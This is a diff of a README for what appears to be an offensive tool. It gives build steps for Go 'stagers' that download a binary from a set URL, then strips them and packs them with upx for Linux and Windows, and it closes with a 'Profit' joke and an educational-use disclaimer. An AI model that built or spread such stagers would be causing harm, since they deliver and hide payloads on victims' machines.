@@ -39,19 +39,23 @@ Since we communicate with our API we need to set it up. The API(located in ./API
 ## Building
 
 ### Linux
-1. `cd Scripts`
-2. `./supergirl.sh setup python3`
-3. `./supergirl.sh build`
+```
+$ cd Scripts
+$ ./supergirl.sh setup python3
+$ ./supergirl.sh build
+```
 
 ### Windows
-1. `cd Scripts`
-2. `.\supergirl.ps1 setup C:\\...\\python.exe`
-3. `.\supergirl.ps1 build`
+```
+PS> cd Scripts
+PS> .\supergirl.ps1 -mode setup -path C:\\...\\python.exe
+PS> .\supergirl.ps1 -mode build
+```
 
 ### Building Stager
 1. Upload your Binary which you gathered from the previous step
 2. Go to `./Stagers/Go` and open `main.go`
-3. Change line 39 `var url string = "yourdirecturlhere"`
+3. Change line 39 `var url string = "your-direct-download-url-here"`
 
 #### Building a Linux Stager
 4. `GOOS=linux go build -ldflags="-s -w" -o stager main.go`
@@ -59,11 +63,20 @@ Since we communicate with our API we need to set it up. The API(located in ./API
 #### Building a Windows Stager
 5. `GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o stager.exe main.go`
 
+6. Optionally compress the Stager(.exe) binary with upx
+
+7. LINUX: `upx --ultra-brute -o compressed_stager stager`
+7. WINDOWS: `upx.exe --ultra-brute -o compressed_stager.exe stager.exe`
+
+8. Wait...
+9. ???
+10. Profit.
+
 
 # Disclaimer
 
 ### FOR EDUCATIONAL PURPOSE ONLY I AM NOT RESPONSIBLE FOR ANYTHING
-
+```
 MIT License
 
 Copyright (c) 2017 ThoughtfulDev
@@ -85,3 +98,4 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
+```
